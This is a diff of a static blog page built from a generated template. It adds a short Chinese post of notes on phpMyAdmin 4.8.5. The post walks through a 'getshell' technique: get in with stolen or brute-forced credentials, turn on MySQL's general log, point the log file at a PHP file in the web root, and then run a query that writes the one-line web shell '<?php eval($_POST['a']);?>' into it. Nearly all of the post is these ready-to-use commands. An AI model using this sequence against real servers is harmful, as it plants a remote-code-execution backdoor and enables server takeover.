@@ -30,29 +30,9 @@
       
         <div class="animated fadeInLeft" style="animation-delay: 0.4s">
           <p class="my-4 text-gray-600 font-light hidden lg:block">
-            我等着，等着你
+            文章目录
           </p>
-          <div class="animated fadeInLeft social-container hidden lg:block" style="animation-delay: 0.6s">
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
+          <div class="toc-container hidden lg:block">
             
           </div>
         </div>
@@ -97,41 +77,61 @@
 </div>
 <div class="mask" onclick="closeMenu()">
 </div>
-      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4">
-        <h2 class="text-lg text-gray-700 mb-8">
-          <i class="ri-bookmark-line"></i> 转载
-        </h2>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">phpMyAdmin随记</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-29 / 1 min read
+        </div>
         
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${0 * 0.2}s` }">
-    
-    <div class="content">
-      <a href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">（转载）互联网协议入门（二）</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-11-24 / 10 min read</div>
-    </div>
-  </section>
+        <div class="post-content yue">
+          <p>版本：phpMyAdmin4.8.5</p>
+<p>查阅版本信息：</p>
+<p>http://localhost/phpMyAdmin4.8.5/README<br>
+http://localhost/phpMyAdmin4.8.5/changelog.php</p>
+<p>phpMyAdmin常规getshell<br>
+1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
+2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
+<p>查看写入权限</p>
+<pre><code>show variables like '%secure%'
+</code></pre>
+<p>查看日志设置</p>
+<pre><code>show variables like 'general_log%'
+</code></pre>
+<pre><code>第一步手动开启日志。
+set global  general_log='on'   //首先设置为on
+第二步 修改日志路径
+set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
+然后 查看是否开启成功
+show variables like &quot;general_log%&quot;
+</code></pre>
+<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
+select '&lt;?php eval($_POST['a']);?&gt;'
+虽然报错但已经写进去了
+</code></pre>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
 
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${1 * 0.2}s` }">
-    
-    <div class="content">
-      <a href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">（转载）互联网协议入门（一）</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-11-24 / 18 min read</div>
-    </div>
-  </section>
+        </div>
 
-        <div class="pagination-container animated fadeIn">
-  
-  
-</div>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/">
+                <h3 class="post-title">
+                  phpinfo中值得注意的点
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
 
       </div>
     </div>
